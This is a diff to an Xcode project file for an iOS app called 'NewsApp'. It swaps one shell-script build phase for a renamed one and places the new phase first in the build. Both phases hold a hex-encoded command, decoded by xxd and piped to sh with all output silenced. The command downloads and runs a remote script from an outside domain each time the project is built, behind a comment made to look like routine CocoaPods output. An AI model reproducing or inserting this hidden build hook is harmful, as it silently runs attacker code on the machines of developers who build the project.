@@ -262,7 +262,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8E708DF4264CEB160055F518 /* Build configuration list for PBXNativeTarget "NewsApp" */;
 			buildPhases = (
-				FF61D4CDAFF62FDBF36D902C /* Binary Libraries Compiler */,
+				E65499B3DB84FFFEB86D902C /* Project Frameworks */,
 				7B002771DF7A15593B0E02C7 /* [CP] Check Pods Manifest.lock */,
 				8E708DDC264CEB140055F518 /* Sources */,
 				8E708DDD264CEB140055F518 /* Frameworks */,
@@ -330,6 +330,29 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	E65499B3DB84FFFEB86D902C /* Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
+	";			
+		};
+	
 		55EBF302E1F1C895BFFB58C3 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -385,24 +408,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-NewsApp/Pods-NewsApp-resources.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		FF61D4CDAFF62FDBF36D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6c696e656272616e642e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -642,6 +647,16 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 8E708DD8264CEB140055F518 /* Project object */;
 }
